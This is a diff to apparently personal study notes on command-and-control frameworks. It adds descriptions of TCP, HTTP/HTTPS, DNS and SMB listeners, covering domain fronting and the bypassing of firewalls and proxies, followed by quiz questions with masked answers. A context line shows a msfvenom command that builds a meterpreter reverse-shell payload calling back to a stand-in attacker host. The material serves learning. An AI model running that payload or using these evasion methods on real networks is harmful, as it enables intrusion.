@@ -367,6 +367,32 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe
   > - *Callback from the Victim*
 
 
+### Listener Type
+- As previously mentioned, standard reverse shell listeners are not the only ones that exist; there are many varieties that use many different protocols; however, there are a few common ones that we will cover, these being the following:
+#### Standard Listener 
+   - These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. 
+   - Metasploit has full support for generic listeners.
+#### HTTP/HTTPS Listeners 
+   - These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. 
+   - When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW. 
+   - Metasploit has full support for HTTP/HTTPS listeners.
+#### DNS Listener 
+   - DNS Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. 
+   - It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. 
+   - For more information, see this "Meterpreter over DNS" presentation by Alexey Sintsov and Maxim Andreyanov. 
+   - These are often very useful for bypassing Network Proxies.
+#### SMB Listener 
+   - Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. 
+   - Metasploit has support for Named Pipes.
+
+### Answer the questions below
+- Which listener should you choose if you have a device that cannot easily access the internet?
+  > Answer format: [`***`]()
+- Which listener should you choose if you're accessing a restricted network segment?
+  > Answer format: [`***`]()
+- Which listener should you choose if you are dealing with a Firewall that does protocol inspection?
+  > Answer format: [`*****`]()
+
 
 
 ---
